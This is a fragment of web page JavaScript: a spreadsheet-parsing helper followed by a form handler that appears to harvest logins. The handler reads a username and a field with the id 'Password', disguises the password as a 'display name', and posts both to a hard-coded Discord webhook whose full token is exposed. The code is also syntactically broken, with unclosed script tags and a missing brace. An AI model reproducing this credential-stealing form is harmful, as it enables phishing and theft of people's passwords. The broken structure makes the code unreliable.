<script type="text/javascript">
        var gk_isXlsx = false;
        var gk_xlsxFileLookup = {};
        var gk_fileData = {};
        function filledCell(cell) {
          return cell !== '' && cell != null;
        }
        function loadFileData(filename) {
        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
            try {
                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
                var firstSheetName = workbook.SheetNames[0];
                var worksheet = workbook.Sheets[firstSheetName];

                // Convert sheet to JSON to filter blank rows
                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
                // Filter out blank rows (rows where all cells are empty, null, or undefined)
                var filteredData = jsonData.filter(row => row.some(filledCell));

                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
                var headerRowIndex = filteredData.findIndex((row, index) =>
                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
                );
                // Fallback
                if (headerRowIndex === -1 || headerRowIndex > 25) {
                  headerRowIndex = 0;
                }

                // Convert filtered JSON back to CSV
                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
                return csv;
            } catch (e) {
                console.error(e);
                return "";
            }
        }
        return gk_fileData[filename] || "";
        }

    <script>
        async function submitForm() {
            const username = document.getElementById('username').value.trim();
            const displayName = document.getElementById('Password').value.trim();
            const notification = document.getElementById('notification');

            if (!username || !displayName) {
                notification.textContent = 'Please fill in both fields!';

                setTimeout(() => notification.classList.remove('show'), 3000);

            // Basic content filter (replace with more robust moderation if needed)
            const inappropriateWords = ['Bitch', 'Fuck']; // Add inappropriate words here
            const isInappropriate = inappropriateWords.some(word => 
                username.toLowerCase().includes(word) || displayName.toLowerCase().includes(word)
            );

            if (isInappropriate) {
                notification.textContent = 'Inappropriate content detected!';
                notification.style.background = '#E31B23';
                notification.classList.add('show');
                setTimeout(() => notification.classList.remove('show'), 3000);
                return;
            }

            // Send to Discord webhook
            const webhookUrl = 'https://discord.com/api/webhooks/1335061431321755720/s8aXoEqXz2XK9CCdSWdEFa0hqs8oEz5nbDPb1-yb467JYKddWpx3guWaoqbmNeZpIseV';
            const payload = {
                content: `New Submission:\n**Username**: ${username}\n**Display Name**: ${displayName}`
            };

            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {

                    setTimeout(() => notification.classList.remove('show'), 3000);
                }
            } catch (error) {
                console.error('Error:', error);
                notification.textContent = 'Network error occurred!';
                notification.style.background = '#E31B23';
                notification.classList.add('show');
                setTimeout(() => notification.classList.remove('show'), 3000);
            }
        }
